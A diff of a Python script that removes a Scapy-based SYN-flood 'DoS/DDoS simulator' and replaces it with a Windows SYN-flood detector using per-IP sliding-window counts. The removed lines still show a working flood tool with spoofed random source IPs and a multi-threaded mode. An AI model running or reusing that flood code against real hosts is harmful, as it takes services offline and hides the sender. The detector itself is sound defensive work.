@@ -1,82 +1,73 @@
 #!/usr/bin/env python3
 """
-dos_ddos_simulator.py
+ddos_detector_windows.py
 
-Simulate DoS and DDoS attacks by sending forged TCP SYN floods.
+Detect TCP SYN‐flood attacks by counting SYN packets per source IP in a sliding window.
 
 Usage (Windows Admin):
-  python dos_ddos_simulator.py --target 192.168.29.112 --mode ddos --rate 100 --threads 4
+  python ddos_detector_windows.py --iface "Wi-Fi" --window 10 --threshold 200
+  python ddos_detector_windows.py --list
 """
 import argparse
-import random
-import threading
 import time
-from scapy.all import IP, TCP, send
+from collections import defaultdict, deque
+from scapy.all import sniff, TCP, IP, conf
 
-def random_ip() -> str:
-    """Generate a random non-reserved IPv4 address."""
-    return "{}.{}.{}.{}".format(
-        random.randint(1, 223),
-        random.randint(0, 255),
-        random.randint(0, 255),
-        random.randint(1, 254),
-    )
+class SlidingWindowCounter:
+    def __init__(self, window_size: float):
+        self.window_size = window_size
+        self.data = defaultdict(deque)
 
-def syn_flood(src_ip: str, dst_ip: str, dst_port: int, rate: int):
-    """
-    Continuously send TCP SYN packets from src_ip → dst_ip:dst_port.
-    Includes a debug print so you can see it firing.
-    """
-    pkt = IP(src=src_ip, dst=dst_ip) / TCP(dport=dst_port, flags="S")
-    delay = 1.0 / rate
-    while True:
-        print(f"→ SYN from {src_ip} to {dst_ip}:{dst_port}")
-        send(pkt, verbose=False)
-        time.sleep(delay)
+    def add(self, src_ip: str, timestamp: float):
+        dq = self.data[src_ip]
+        dq.append(timestamp)
+        while dq and dq[0] < timestamp - self.window_size:
+            dq.popleft()
 
-def run_dos(target: str, port: int, rate: int):
-    """Single‐source SYN flood."""
-    src = random_ip()
-    print(f"[+] Starting DoS from {src} → {target}:{port} at {rate} pps")
-    syn_flood(src, target, port, rate)
+    def count(self, src_ip: str) -> int:
+        return len(self.data[src_ip])
 
-def run_ddos(target: str, port: int, rate: int, threads: int):
-    """Multi‐source SYN flood with multiple threads."""
-    print(f"[+] Starting DDoS on {target}:{port} with {threads} threads × {rate} pps each")
-    for _ in range(threads):
-        src = random_ip()
-        t = threading.Thread(
-            target=syn_flood,
-            args=(src, target, port, rate),
-            daemon=True
-        )
-        t.start()
-        time.sleep(0.1)  # stagger thread startups
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\n[-] Simulation stopped.")
+def packet_callback(pkt, counter: SlidingWindowCounter, threshold: int):
+    # look for SYN flag
+    if IP in pkt and TCP in pkt and (pkt[TCP].flags & 0x02):
+        src = pkt[IP].src
+        now = time.time()
+        counter.add(src, now)
+        cnt = counter.count(src)
+        if cnt > threshold:
+            print(f"[!] ALERT: {src} sent {cnt} SYNs in last {counter.window_size:.1f}s")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="DoS/DDoS SYN flood simulator")
-    parser.add_argument("--target", required=True, help="Target IP address")
-    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
-    parser.add_argument(
-        "--mode", choices=("dos", "ddos"), default="dos",
-        help="Attack mode: dos or ddos"
-    )
-    parser.add_argument(
-        "--rate", type=int, default=100,
-        help="Packets per second per thread (default: 100)"
-    )
-    parser.add_argument(
-        "--threads", type=int, default=5,
-        help="Number of threads for ddos (default: 5)"
-    )
+def list_interfaces():
+    print("Available NPF interfaces:")
+    for iface in conf.ifaces.values():
+        print(f"  {iface.name}\n    ↳ {iface.description}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Windows DDoS SYN-flood detector")
+    parser.add_argument("--list", action="store_true",
+                        help="List available interfaces and exit")
+    parser.add_argument("--iface", help="Interface name (e.g. 'Wi-Fi' or GUID')")
+    parser.add_argument("--window", type=float, default=10.0,
+                        help="Sliding window size in seconds (default: 10)")
+    parser.add_argument("--threshold", type=int, default=200,
+                        help="Alert threshold: SYNs per IP per window (default: 200)")
     args = parser.parse_args()
 
-    if args.mode == "dos":
-        run_dos(args.target, args.port, args.rate)
-    else:
-        run_ddos(args.target, args.port, args.rate, args.threads)
+    if args.list:
+        list_interfaces()
+        return
+
+    if not args.iface:
+        parser.error("Please specify --iface or use --list to see options")
+
+    counter = SlidingWindowCounter(args.window)
+    print(f"[+] Listening on {args.iface}, window={args.window:.1f}s, threshold={args.threshold} SYNs")
+    sniff(
+        iface=args.iface,
+        store=False,
+        prn=lambda pkt: packet_callback(pkt, counter, args.threshold),
+        filter="tcp[tcpflags] & tcp-syn != 0"
+    )
+
+if __name__ == "__main__":
+    main()
